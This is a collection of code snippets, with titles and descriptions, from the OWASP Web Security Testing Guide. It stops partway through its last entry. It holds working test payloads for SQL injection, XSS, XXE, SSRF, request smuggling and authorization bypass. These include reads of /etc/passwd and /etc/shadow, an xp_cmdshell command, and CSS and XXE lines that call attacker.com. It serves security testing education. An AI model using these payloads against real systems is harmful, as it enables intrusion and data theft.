text\nCODE:\n```\nRSA/ECB/OAEPWithSHA-1AndMGF1Padding (2048)\nRSA/ECB/OAEPWithSHA-256AndMGF1Padding (2048)\n```\n\n----------------------------------------\n\nTITLE: SQL Injection Example with MD5 Password and Comment Bypass\nDESCRIPTION: A more complex SQL injection example where the query contains parentheses and an MD5 hash function. The injection uses a comment operator to ignore the password verification portion of the query.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))\n```\n\n----------------------------------------\n\nTITLE: Testing Horizontal Authorization Bypass - ViewSettings Request\nDESCRIPTION: Example of testing horizontal privilege escalation by attempting to access another user's settings with different session tokens.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nPOST /account/viewSettings HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=USER_SESSION\n\nusername=example_user\n```\n\n----------------------------------------\n\nTITLE: Missing Origin Check in Message Event Listener\nDESCRIPTION: Example of insecure code that processes message events without validating the origin, accepting input from any domain.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.addEventListener(\"message\", callback, true);\n\nfunction callback(e) {\n        /* process message (e.data) */\n}\n```\n\n----------------------------------------\n\nTITLE: IMAP Command Injection Structure Example\nDESCRIPTION: Example showing how to structure an IMAP injection attack with header, body, and footer components to execute arbitrary commands on the mail server.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\n???? FETCH 4791 BODY[HEADER]\nV100 CAPABILITY\nV101 FETCH 4791 BODY[HEADER]\n```\n\n----------------------------------------\n\nTITLE: SQL Injection Example with OR Condition\nDESCRIPTION: This example demonstrates how a malicious user could inject the condition \"10 or 1=1\" to manipulate the WHERE clause and change the query logic to return all records instead of just the record with id=10.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nselect title, text from news where id=10 or 1=1\n```\n\n----------------------------------------\n\nTITLE: Testing Refresh Token Exchange Request\nDESCRIPTION: HTTP POST request example demonstrating how to test refresh token validation by exchanging a refresh token for a new access token, using form parameters in the request body.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_9\n\nLANGUAGE: http\nCODE:\n```\nPOST /token HTTP/1.1\nHost: as.example.com\nCookie: [...]\n[...]\n\ngrant_type=refresh_token\n&refresh_token=eyJhbGciOiJIUz[...]\n&client_id=example-client\n\n```\n\n----------------------------------------\n\nTITLE: Examining Structured Cookie Format Example\nDESCRIPTION: Demonstrates a sample structured cookie format showing different fields including ID (hexadecimal), CR (small integer), TM and LM (large integers), and S (alphanumeric) components with their delimiter patterns.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nID=5a0acfc7ffeb919:CR=1:TM=1120514521:LM=1120514521:S=j3am5KzC4v01ba3q\n```\n\n----------------------------------------\n\nTITLE: Host Header Request to Access Private Virtual Hosts\nDESCRIPTION: An HTTP Host header that targets an internal hostname, potentially allowing access to private virtual hosts that are not intended to be externally accessible.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md#2025-04-22_snippet_7\n\nLANGUAGE: http\nCODE:\n```\nHost: intranet.example.org\n```\n\n----------------------------------------\n\nTITLE: Running Attack Surface Detector CLI Against Web Applications\nDESCRIPTION: Basic command for running the Attack Surface Detector CLI tool to identify endpoints from a web application's source code. The command requires specifying the source code path and accepts optional flags.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md#2025-04-22_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\njava -jar attack-surface-detector-cli-1.3.5.jar <source-code-path> [flags]\n```\n\n----------------------------------------\n\nTITLE: Vulnerable JavaScript Code with Sensitive Data\nDESCRIPTION: Example of JavaScript code containing sensitive data in an array, using forEach method which can be exploited through prototype chaining.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n...\n(function() {\n  var secret = [\"578a8c7c0d8f34f5\", \"345a8b7c9d8e34f5\"];\n\n  secret.forEach(function(element) {\n    // do something here\n  });  \n})();\n...\n```\n\n----------------------------------------\n\nTITLE: Extracting SSL Certificate Public Key for Payment Gateway Testing\nDESCRIPTION: Bash command to extract the public key from a server's SSL certificate, which might be used for creating encrypted payment requests if the application reuses the same key pair.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\necho -e '\\0' | openssl s_client -connect example.org:443 2>/dev/null | openssl x509 -pubkey -noout\n```\n\n----------------------------------------\n\nTITLE: XPath Injection Payload for Authentication Bypass\nDESCRIPTION: Sample input values that could be used to bypass authentication through XPath injection, creating a query that always evaluates to true.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nUsername: ' or '1' = '1\nPassword: ' or '1' = '1\n```\n\n----------------------------------------\n\nTITLE: Batching Attack in GraphQL\nDESCRIPTION: This snippet demonstrates how to perform a batching attack in GraphQL by sending multiple queries in a single request to efficiently extract sensitive information.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md#2025-04-22_snippet_6\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  Veterinary(id: \"1\") {\n    name\n  }\n  second:Veterinary(id: \"2\") {\n    name\n  }\n  third:Veterinary(id: \"3\") {\n    name\n  }\n}\n```\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  auth(veterinaryName: \"Julien\")\n  second: auth(veterinaryName:\"Benoit\")\n}\n```\n\n----------------------------------------\n\nTITLE: Password Reset Poisoning HTTP Request\nDESCRIPTION: An HTTP request to the password reset functionality with a manipulated Host header, attempting to redirect the reset link to an attacker-controlled domain.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md#2025-04-22_snippet_5\n\nLANGUAGE: http\nCODE:\n```\nPOST /request_password_reset.php HTTP/1.1\nHost: www.attacker.com\n[...]\n\nemail=user@example.org\n```\n\n----------------------------------------\n\nTITLE: IIS 5.0 Firewall Bypass Using HTTP Request Smuggling\nDESCRIPTION: This multi-part request demonstrates how to bypass a firewall to execute directory traversal attacks against IIS 5.0. The technique exploits IIS 5.0's 48K POST request limitation when the Content-Type is not application/x-www-form-urlencoded, enabling an attacker to hide malicious commands that won't be detected by intermediary security devices.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\nPOST /target.asp HTTP/1.1        <-- Request #1\nHost: target\nConnection: Keep-Alive\nContent-Length: 49225\n<CRLF>\n<49152 bytes of garbage>\n```\n\nLANGUAGE: html\nCODE:\n```\nPOST /target.asp HTTP/1.0        <-- Request #2\nConnection: Keep-Alive\nContent-Length: 33\n<CRLF>\n```\n\nLANGUAGE: html\nCODE:\n```\nPOST /target.asp HTTP/1.0        <-- Request #3\nxxxx: POST /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0   <-- Request #4\nConnection: Keep-Alive\n<CRLF>\n```\n\n----------------------------------------\n\nTITLE: Simple DOM-Based XSS via URL Parameter\nDESCRIPTION: A vulnerable script that extracts a parameter from the URL and writes it directly to the document without sanitization, allowing for XSS attacks through the URL.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<script>\nvar pos=document.URL.indexOf(\"message=\")+5;\ndocument.write(document.URL.substring(pos,document.URL.length));\n</script>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable loadMovie Implementation\nDESCRIPTION: Example of unsafe usage of loadMovie method with an unvalidated _root.URL parameter that could be exploited with asfunction.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_13\n\nLANGUAGE: actionscript\nCODE:\n```\nloadMovie(_root.URL)\n```\n\n----------------------------------------\n\nTITLE: Server Response with Compromised CORS Headers\nDESCRIPTION: An HTTP response showing how a server with a vulnerable CORS implementation might return the attacker's domain in the Access-Control-Allow-Origin header, allowing the attacker to read sensitive data from the response.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_5\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: https://example.com.attacker.com\nAccess-Control-Allow-Credentials: true\nContent-Length: 4\nContent-Type: application/xml\n\n[Response Body]\n```\n\n----------------------------------------\n\nTITLE: Potential JavaScript Injection via ExternalInterface\nDESCRIPTION: This JavaScript snippet shows how malicious code could be executed if injected via the ExternalInterface vulnerability. The eval function is used to execute arbitrary code.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\neval(evilcode)\n```\n\n----------------------------------------\n\nTITLE: Fetching HTTP Headers with cURL\nDESCRIPTION: Command line examples using cURL to fetch and inspect HTTP headers from a web application, including options for following redirects and handling firewall restrictions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl -I https://example.com\n```\n\nLANGUAGE: bash\nCODE:\n```\ncurl -L -I https://example.com\n```\n\nLANGUAGE: bash\nCODE:\n```\ncurl -I -L -k --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36\" https://example.com\n```\n\n----------------------------------------\n\nTITLE: Leaking CSV Data via JavaScript Runtime Errors\nDESCRIPTION: This example shows how CSV data could be leaked through JavaScript runtime errors in older versions of Internet Explorer (IE9/10). The browser attempts to execute the CSV as JavaScript, resulting in an error that exposes the sensitive data.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<!--error handler -->\n<script>window.onerror = function(err) {alert(err)}</script>\n<!--load target CSV -->\n<script src=\"https://victim.com/service/csvendpoint\"></script>\n```\n\n----------------------------------------\n\nTITLE: Basic SQL Query with Boolean Injection\nDESCRIPTION: Example of a basic SQL query vulnerable to boolean-based injection, demonstrating the use of SUBSTRING and ASCII functions for blind exploitation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_24\n\nLANGUAGE: sql\nCODE:\n```\nSELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'\n```\n\n----------------------------------------\n\nTITLE: HTTP POST Request for Group-Based Order Access\nDESCRIPTION: An example HTTP POST request showing how a user belonging to 'grp001' accesses order #0001. This can be tested for privilege escalation by modifying the groupID parameter to check if unauthorized users can access restricted data.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nPOST /user/viewOrder.jsp HTTP/1.1\nHost: www.example.com\n...\n\ngroupID=grp001&orderID=0001\n```\n\n----------------------------------------\n\nTITLE: Testing Price Tampering in Basket Addition\nDESCRIPTION: Example HTTP request demonstrating how to test for price tampering by including a price parameter in the basket addition request, which could allow manipulating item prices.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nPOST /api/basket/add HTTP/1.1\nHost: example.org\n\nitem_id=1&quantity=5&price=2.00\n```\n\n----------------------------------------\n\nTITLE: Format String Fuzzing Payload Examples\nDESCRIPTION: A set of test payloads for fuzzing applications for format string vulnerabilities, including normal input, C-style format specifiers, and Python-specific format injection attempts.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nalice\n%s%s%s%n\n%p%p%p%p%p\n{event.__init__.__globals__[CONFIG][SECRET_KEY]}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Vulnerable Script for XSS via location.hash in JavaScript\nDESCRIPTION: This code snippet shows a vulnerable script where an attacker can control the src attribute of a script element through location.hash, potentially leading to XSS attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script>\n    var d=document.createElement(\"script\");\n    if(location.hash.slice(1)) {\n        d.src = location.hash.slice(1);\n    }\n    document.body.appendChild(d);\n</script>\n```\n\n----------------------------------------\n\nTITLE: Sample API Endpoint URLs with Object Identifiers\nDESCRIPTION: Examples of API endpoints that accept object identifiers which could be vulnerable to BOLA attacks. These examples demonstrate common patterns in REST and GraphQL APIs where object identifiers are used.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nGET /api/users/{user_id}\nGET /api/orders/{order_id}\nPOST /graphql\n        query: {user(id: \"123\") }\n```\n\n----------------------------------------\n\nTITLE: HTML Injection for PDF Generator SSRF Exploitation\nDESCRIPTION: HTML code showing iframe injection that can be used in PDF generators to exploit SSRF vulnerabilities to read local files.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<iframe src=\"file:///etc/passwd\" width=\"400\" height=\"400\">\n<iframe src=\"file:///c:/windows/win.ini\" width=\"400\" height=\"400\">\n```\n\n----------------------------------------\n\nTITLE: AWS CLI Bucket Listing Command\nDESCRIPTION: Command to list all objects in a public S3 bucket using AWS CLI\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\naws s3 ls s3://<bucket-name>\n```\n\n----------------------------------------\n\nTITLE: Enumerating Nginx Admin Paths\nDESCRIPTION: Common Nginx admin paths to check during penetration testing. These paths may reveal Nginx server status, configuration, and error pages.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md#2025-04-22_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n/index.html\n/index.htm\n/index.php\n/nginx_status\n/index.php\n/nginx.conf\n/html/error\n```\n\n----------------------------------------\n\nTITLE: URL Parameter Structure Example\nDESCRIPTION: Example of URL parameter formatting in query strings showing parameter pair format and multiple parameter separation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nfoo=bar\n```\n\n----------------------------------------\n\nTITLE: Testing File System Resource Access through Image Parameter\nDESCRIPTION: This example shows how a direct file reference parameter can be manipulated to access unauthorized files, often used in conjunction with path traversal attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nhttps://foo.bar/showImage?img=img00011\n```\n\n----------------------------------------\n\nTITLE: Extracting Database Name Length using Time-Based Blind SQL Injection\nDESCRIPTION: A sophisticated blind SQL injection that determines the length of the current database name by comparing it with different values and using WAITFOR DELAY to communicate the result through timing.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\ndeclare @s varchar(8000)\ndeclare @i int\nselect @s = db_name()\nselect @i = [some value]\nif (select len(@s)) < @i waitfor delay '0:0:5'\n```\n\n----------------------------------------\n\nTITLE: Analyzing robots.txt for Restricted Directories\nDESCRIPTION: Example of a robots.txt file that reveals sensitive directories meant to be hidden from web crawlers. These disallowed paths often contain sensitive content that administrators don't want indexed but might be directly accessible.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\nUser-agent: *\nDisallow: /Admin\nDisallow: /uploads\nDisallow: /backup\nDisallow: /~jbloggs\nDisallow: /include\n```\n\n----------------------------------------\n\nTITLE: SSTI Testing in Code Context - Normal Request\nDESCRIPTION: This example shows a normal request where a parameter is processed by a template engine without any exploitation attempt.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md#2025-04-22_snippet_4\n\nLANGUAGE: text\nCODE:\n```\npersonal_greeting=username\nHello user01\n```\n\n----------------------------------------\n\nTITLE: Additional XML External Entity (XXE) Injection Tests in XML\nDESCRIPTION: Provides more examples of XXE injection tests targeting different system files and remote resources.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_5\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"https://www.attacker.com/text.txt\" >]><foo>&xxe;</foo>\n```\n\n----------------------------------------\n\nTITLE: Basic SQL Injection Example with OR Condition\nDESCRIPTION: A simple SQL injection example that uses the OR 1=1 technique to bypass authentication or return all records from a database table by manipulating a query.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nselect * from books where title=\"'Bomba' OR 1=1-\"\n```\n\n----------------------------------------\n\nTITLE: CSS Selector Attack for Data Exfiltration\nDESCRIPTION: This HTML/CSS code demonstrates how CSS selectors can be used to exfiltrate sensitive data like CSRF tokens by creating attribute selectors that match specific patterns and leak the information via external resource requests.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<style>\ninput[name=csrf_token][value=^a] {\n    background-image: url(https://attacker.com/log?a);\n}\n</style>\n```\n\n----------------------------------------\n\nTITLE: Server Response After Authentication in HTTP\nDESCRIPTION: This snippet shows a server response after a successful authentication. It's crucial for testing session fixation as it demonstrates whether the server issues a new session ID upon successful login.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation.md#2025-04-22_snippet_3\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nDate: Thu, 14 Aug 2008 14:52:58 GMT\nServer: Apache/2.2.2 (Fedora)\nX-Powered-By: PHP/5.1.6\nContent-language: en\nCache-Control: private, must-revalidate, max-age=0\nX-Content-Encoding: gzip\nContent-length: 4090\nConnection: close\nContent-Type: text/html; charset=UTF-8\n...\nHTML data\n...\n```\n\n----------------------------------------\n\nTITLE: HTTP POST Request Example for Authentication Testing\nDESCRIPTION: Example of a POST request used for application authentication. It demonstrates parameters passed in multiple locations: query string, request headers via cookies, and request body, providing multiple potential injection points.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md#2025-04-22_snippet_6\n\nLANGUAGE: http\nCODE:\n```\nPOST /example/authenticate.asp?service=login HTTP/1.1\nHost: x.x.x.x\nCookie: SESSIONID=dGhpcyBpcyBhIGJhZCBhcHAgdGhhdCBzZXRzIHByZWRpY3RhYmxlIGNvb2tpZXMgYW5kIG1pbmUgaXMgMTIzNA==;CustomCookie=00my00trusted00ip00is00x.x.x.x00\n\nuser=admin&pass=pass123&debug=true&fromtrustIP=true\n```\n\n----------------------------------------\n\nTITLE: Example of Custom Global State in Window Object\nDESCRIPTION: This code demonstrates how developers might store application state in the global window object. While this data only persists during runtime, it could still contain sensitive information accessible to malicious scripts.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.MY_STATE = {\n  counter: 0,\n  flag: false,\n};\n```\n\n----------------------------------------\n\nTITLE: Malicious URL for asfunction Injection\nDESCRIPTION: Shows a malicious URL format that injects asfunction protocol to execute JavaScript through the loadMovie method.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_14\n\nLANGUAGE: text\nCODE:\n```\nhttps://victim/file.swf?URL=asfunction:getURL,javascript:evilcode\n```\n\n----------------------------------------\n\nTITLE: Bypassing Access Control with HEAD Method\nDESCRIPTION: Example of using a HEAD request to potentially bypass authentication and access protected admin pages that normally redirect to a login page. The response shows administrative cookies being set instead of a redirect.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_13\n\nLANGUAGE: http\nCODE:\n```\nHEAD /admin/ HTTP/1.1\nHost: example.org\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\n[...]\nSet-Cookie: adminSessionCookie=[...];\n```\n\n----------------------------------------\n\nTITLE: Bypassing Access Control with Custom HTTP Method\nDESCRIPTION: Example of using a non-standard HTTP method (FOO) to send a request to an admin page with user creation parameters in the body, potentially bypassing method-based restrictions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_15\n\nLANGUAGE: http\nCODE:\n```\nFOO /admin/createUser.php\nHost: example.org\nContent-Length: 36\n\nusername=foo&password=bar&role=admin\n```\n\n----------------------------------------\n\nTITLE: XSS Injection Using HTML Entities in IMG Tag\nDESCRIPTION: Demonstrates an XSS injection using HTML entities in an IMG tag's onerror attribute. This technique can bypass filters that block plain text JavaScript in attributes.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/D-Encoded_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<IMG src=\"\" onerror=javascript:alert(&quot;XSS&quot;)>\n```\n\n----------------------------------------\n\nTITLE: Java Example of Using Different Initialization Vectors\nDESCRIPTION: This code snippet demonstrates the proper use of different Initialization Vectors (IV) for each encryption operation in Java, which is crucial for maintaining the security of the encryption process.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md#2025-04-22_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n// Use a different IV value for every encryption\nbyte[] newIv = ...;\ns = new GCMParameterSpec(s.getTLen(), newIv);\ncipher.init(..., s);\n...\n```\n\n----------------------------------------\n\nTITLE: Demonstrating HTTP POST Request for Command Injection Testing\nDESCRIPTION: This code snippet shows an example of a POST HTTP request that can be used to test for command injection vulnerabilities. It includes headers and a simple document request payload.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\nPOST /public/doc HTTP/1.1\nHost: www.example.com\n[...]\nReferer: https://127.0.0.1/WebGoat/attack?Screen=20\nCookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5\nAuthorization: Basic T2Vbc1Q9Z3V2Tc3e=\nContent-Type: application/x-www-form-urlencoded\nContent-length: 33\n\nDoc=Doc1.pdf\n```\n\n----------------------------------------\n\nTITLE: Executing Shell Command with xp_cmdshell in SQL Server\nDESCRIPTION: This SQL injection payload uses xp_cmdshell to execute a directory listing command and write the output to a text file in the web root. This technique requires sysadmin privileges on the database server.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nexec master.dbo.xp_cmdshell 'dir c:\\inetpub > c:\\inetpub\\wwwroot\\test.txt'--\n```\n\n----------------------------------------\n\nTITLE: Identifying Hidden Links in HTML Comments\nDESCRIPTION: Example of sensitive functionality hidden in HTML comments that might reveal upload capabilities. These commented-out links can expose application functionality that was intended to be hidden.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<!-- <A HREF=\"uploadfile.jsp\">Upload a document to the server</A> -->\n<!-- Link removed while bugs in uploadfile.jsp are fixed          -->\n```\n\n----------------------------------------\n\nTITLE: Testing Application Platform Configuration Checklist in Markdown\nDESCRIPTION: A comprehensive markdown checklist detailing configuration testing guidelines for web and application servers, including system configuration review points, logging considerations, and security best practices.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# Test Application Platform Configuration\n\n|ID          |\n|------------|\n|WSTG-CONF-02|\n\n## Summary\n\nProper configuration of the single elements that make up an application architecture is important in order to prevent mistakes that might compromise the security of the whole architecture.\n\nReviewing and testing configurations are critical tasks in creating and maintaining an architecture. This is because various systems often come with generic configurations, which may not align well with the tasks they're supposed to perform on the specific sites where they're installed.\n\nWhile the typical web and application server installation will contain a lot of functionality (like application examples, documentation, test pages), what is not essential should be removed before deployment to avoid post-install exploitation.\n```\n\n----------------------------------------\n\nTITLE: Exclusion List Bypass URLs\nDESCRIPTION: Example URLs demonstrating methods to bypass PL/SQL Gateway's exclusion list using hex-encoded characters.\nSOURCE: 